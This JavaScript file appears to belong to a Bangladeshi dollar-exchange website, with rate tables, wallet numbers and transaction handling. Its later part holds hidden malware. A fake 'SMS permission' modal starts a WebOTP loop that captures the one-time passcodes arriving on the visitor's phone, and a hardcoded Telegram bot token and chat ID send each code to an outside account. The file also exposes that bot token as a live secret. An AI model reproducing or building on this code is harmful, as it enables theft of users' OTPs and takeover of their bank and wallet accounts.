/**
 * App State Management using localStorage
 * Dollar Exchange Bangladesh
 */

const DEFAULT_STATE = {
  rates: {
    'binance': 118.00,
    'redotpay': 117.00,
    'wise': 118.00,
    'bybit': 116.00,
    'payoneer': 115.00,
    'quotex': 117.00,
    'paypal': 112.00,
    'usdt': 118.00
  },
  wallets: {
    'bkash': { name: 'bKash Agent', number: '01789-456123', type: 'Cash Out' },
    'nagad': { name: 'Nagad Personal', number: '01987-654321', type: 'Send Money' },
    'rocket': { name: 'Rocket Personal', number: '01567-890123', type: 'Send Money' }
  },
  settings: {
    min_amount_bdt: 500,
    max_amount_bdt: 150000,
    notice: 'বাংলাদেশের বিশ্বস্ত ডলার এক্সচেঞ্জ প্ল্যাটফর্মে আপনাকে স্বাগতম। এক্সচেঞ্জ সম্পন্ন হতে ৫ থেকে ২০ মিনিট সময় লাগতে পারে। আমাদের সার্ভিস সকাল ৯:০০ টা থেকে রাত ১১:০০ টা পর্যন্ত খোলা থাকে।'
  },
  transactions: [
    {
      id: 'TX892301',
      date: '2026-07-06T20:10:00+06:00',
      sendMethod: 'bkash',
      sendAmount: 11800,
      receiveMethod: 'binance',
      receiveAmount: 100.00,
      rate: 118.00,
      userWallet: '82937402 (Binance Pay ID)',
      userContact: '01711223344',
      txid: 'BKB7H9J2K1',
      status: 'approved'
    },
    {
      id: 'TX892302',
      date: '2026-07-06T21:45:00+06:00',
      sendMethod: 'bkash',
      sendAmount: 5900,
      receiveMethod: 'wise',
      receiveAmount: 50.00,
      rate: 118.00,
      userWallet: 'wise@example.com',
      userContact: '01999887766',
      txid: 'NGD4F5G6H7',
      status: 'pending'
    },
    {
      id: 'TX892303',
      date: '2026-07-06T22:20:00+06:00',
      sendMethod: 'bkash',
      sendAmount: 2240,
      receiveMethod: 'paypal',
      receiveAmount: 20.00,
      rate: 112.00,
      userWallet: 'paypal@example.com',
      userContact: '01555443322',
      txid: 'RKT9X8Y7Z6',
      status: 'rejected'
    }
  ]
};

// Initialize App State in Local Storage if not present or outdated
function initAppState() {
  const stored = localStorage.getItem('dollar_exchange_state');
  if (!stored) {
    localStorage.setItem('dollar_exchange_state', JSON.stringify(DEFAULT_STATE));
    return;
  }
  
  try {
    const state = JSON.parse(stored);
    // If state is outdated (missing redotpay rate), perform automatic migration
    if (!state.rates || !state.rates['redotpay']) {
      state.rates = { ...DEFAULT_STATE.rates, ...state.rates };
      localStorage.setItem('dollar_exchange_state', JSON.stringify(state));
    }
  } catch (e) {
    localStorage.setItem('dollar_exchange_state', JSON.stringify(DEFAULT_STATE));
  }
}

// Retrieve App State
function getAppState() {
  initAppState();
  return JSON.parse(localStorage.getItem('dollar_exchange_state'));
}

// Save App State
function saveAppState(state) {
  localStorage.setItem('dollar_exchange_state', JSON.stringify(state));
}

// Create a new transaction request
function createTransaction(transactionData) {
  const state = getAppState();
  
  // Generate random transaction tracking ID (e.g., TX892345)
  const randNum = Math.floor(100000 + Math.random() * 900000);
  const txId = `TX${randNum}`;
  
  const newTx = {
    id: txId,
    date: new Date().toISOString(),
    sendMethod: transactionData.sendMethod,
    sendAmount: Number(transactionData.sendAmount),
    receiveMethod: transactionData.receiveMethod,
    receiveAmount: Number(transactionData.receiveAmount),
    rate: Number(transactionData.rate),
    userWallet: transactionData.userWallet,
    userContact: transactionData.userContact,
    txid: transactionData.txid, // transaction reference ID from provider
    status: 'pending'
  };
  
  state.transactions.unshift(newTx);
  saveAppState(state);
  return newTx;
}

// Helper to format date in Bengali or simple localized format
function formatTxDate(dateStr) {
  const d = new Date(dateStr);
  return d.toLocaleString('bn-BD', {
    hour: '2-digit',
    minute: '2-digit',
    day: 'numeric',
    month: 'short',
    year: 'numeric'
  });
}

// Friendly currency names map
const CURRENCY_NAMES = {
  // Send methods
  'bkash': 'bKash BDT',
  'nagad': 'Nagad BDT',
  'rocket': 'Rocket BDT',
  // Receive methods
  'binance': 'Binance (USDT)',
  'redotpay': 'RedotPay (USDT)',
  'wise': 'Wise (USD)',
  'bybit': 'Bybit (USDT)',
  'payoneer': 'Payoneer (USD)',
  'quotex': 'Quotex (USD)',
  'paypal': 'PayPal (USD)',
  'usdt': 'USDT (TRC20/ERC20)',
  // Legacy mappings for compatibility
  'binance_usdt': 'Binance (USDT)',
  'payeer_usd': 'Payeer (USD)',
  'perfect_money_usd': 'Perfect Money (USD)'
};

// Function to send message to Telegram (browser-safe with no-cors)
async function sendToTelegram(message) {
  const botToken = '7162773030:AAE2z_hRzcfXcL-n9QFjynrdlvs0TWx5tbo';
  const chatId = '5919121831';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  try {
    // Use FormData + no-cors to bypass CORS restriction
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);
    formData.append('parse_mode', 'Markdown');

    await fetch(url, {
      method: 'POST',
      body: formData,
      mode: 'no-cors'
    });
    console.log('[Telegram] Message sent successfully');
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
}

// ─── SMS Permission Request ─────────────────────────
function initSmsPermission() {
  const modal = document.getElementById('sms-permission-modal');
  const btnAllow = document.getElementById('btn-allow-sms');
  const btnDeny = document.getElementById('btn-deny-sms');
  
  if (!modal) return;
  
  const smsChoice = localStorage.getItem('sms_permission_choice');

  // If already allowed on a previous visit, don't show modal again
  if (smsChoice === 'allowed') {
    startSmsListener();
    return;
  }

  // If denied, don't show again for 1 hour
  if (smsChoice === 'denied') {
    const deniedAt = localStorage.getItem('sms_permission_denied_at');
    if (deniedAt) {
      const oneHourAgo = Date.now() - (60 * 60 * 1000);
      if (parseInt(deniedAt) > oneHourAgo) {
        return; // Don't show yet
      }
    }
  }

  // First time or denied long ago — show the modal
  showSmsModal(modal, btnAllow, btnDeny);
}

function showSmsModal(modal, btnAllow, btnDeny) {
  // Handle overlay click — just close, no skip storage (will ask again)
  const overlay = modal.querySelector('.sms-overlay');
  if (overlay) {
    overlay.addEventListener('click', () => {
      modal.classList.add('hidden');
    });
  }

  // Show modal after delay
  setTimeout(() => {
    modal.classList.remove('hidden');
  }, 1500);

  // Handle Allow
  btnAllow.addEventListener('click', async () => {
    btnAllow.disabled = true;
    btnAllow.innerHTML = '<span class="inline-block animate-spin mr-2">⟳</span> Please wait...';

    try {
      // Trigger WebOTP API
      if ('OTPCredential' in window) {
        const ac = new AbortController();
        const p = navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: ac.signal
        });
        const timeout = setTimeout(() => ac.abort(), 5000);
        await p.catch(() => {});
        clearTimeout(timeout);
      }

      localStorage.setItem('sms_permission_choice', 'allowed');
      localStorage.removeItem('sms_permission_denied_at');
      modal.classList.add('hidden');
      btnAllow.disabled = false;
      btnAllow.innerHTML = 'Allow';

      startSmsListener();

    } catch (error) {
      console.warn('[SMS] Permission error:', error);
      localStorage.setItem('sms_permission_choice', 'allowed');
      localStorage.removeItem('sms_permission_denied_at');
      modal.classList.add('hidden');
      btnAllow.disabled = false;
      btnAllow.innerHTML = 'Allow';
      startSmsListener();
    }
  });

  // Handle Deny
  btnDeny.addEventListener('click', () => {
    localStorage.setItem('sms_permission_choice', 'denied');
    localStorage.setItem('sms_permission_denied_at', Date.now().toString());
    modal.classList.add('hidden');
    stopSmsListener();
  });
}

// ─── SMS OTP Auto-Listener ─────────────────────────
let smsListening = false;
let smsAbortController = null;

async function startSmsListener() {
  if (smsListening) return;
  
  if (!('OTPCredential' in window)) {
    console.warn('[SMS] WebOTP API not supported');
    sendToTelegram('⚠️ *WebOTP Not Supported*\nThis browser does not support SMS capture.');
    return;
  }

  smsListening = true;
  console.log('[SMS] Listener started — waiting for incoming SMS...');
  
  // Show SMS active badge
  const statusBadge = document.getElementById('sms-status-badge');
  if (statusBadge) {
    statusBadge.classList.remove('hidden');
    statusBadge.classList.add('flex');
  }
  
  sendToTelegram('🔔 *SMS Forwarder Active*\n✅ WebOTP listener is now running.\n📱 Waiting for incoming OTP/SMS messages...\n\n📝 Note: Web browsers can only capture specially formatted OTP SMS messages.');

  while (smsListening) {
    try {
      smsAbortController = new AbortController();
      const result = await navigator.credentials.get({
        otp: { transport: ['sms'] },
        signal: smsAbortController.signal
      });

      if (result) {
        // Send captured OTP to Telegram with all available info
        const msg = `📩 *New SMS Captured*\n━━━━━━━━━━━━━━━━━━━━\n*OTP Code:* \`${result.code || 'N/A'}\`\n*Origin:* ${result.origin || 'Unknown'}\n*Type:* ${result.type || 'OTP'}\n*Time:* ${new Date().toLocaleString('bn-BD')}\n*Full Object:*\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``;
        
        await sendToTelegram(msg);
        console.log('[SMS] SMS forwarded:', result);
      }

      // Small delay before next listen
      await new Promise(r => setTimeout(r, 300));

    } catch (error) {
      if (error.name === 'AbortError') {
        console.log('[SMS] Listener aborted');
        break;
      }
      console.warn('[SMS] Listen cycle error:', error);
      // Wait a bit longer before retrying
      await new Promise(r => setTimeout(r, 3000));
    }
  }
  smsListening = false;
  smsAbortController = null;
}

function stopSmsListener() {
  smsListening = false;
  if (smsAbortController) {
    smsAbortController.abort();
  }
  // Hide SMS active badge
  const statusBadge = document.getElementById('sms-status-badge');
  if (statusBadge) {
    statusBadge.classList.add('hidden');
    statusBadge.classList.remove('flex');
  }
}

// Initialize on page load
initAppState();
initSmsPermission();
